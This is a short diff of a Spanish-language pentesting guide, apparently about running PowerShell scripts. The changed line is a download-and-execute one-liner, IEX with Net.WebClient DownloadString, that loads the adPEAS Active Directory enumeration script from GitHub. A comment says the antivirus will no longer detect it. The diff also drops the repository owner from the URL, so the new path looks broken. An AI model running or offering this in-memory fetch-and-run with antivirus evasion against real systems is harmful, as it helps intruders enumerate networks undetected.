@@ -37,7 +37,7 @@ Los siguientes scripts los podemos ejecutar en la consola de  **Powershell**  an
 
 ```powershell
 # Ya no nos lo detectara el Antivirus 
-❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
+❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adPEAS/main/adPEAS.ps1')
 ```
 
 ## Otra alternativa para el ByPass:
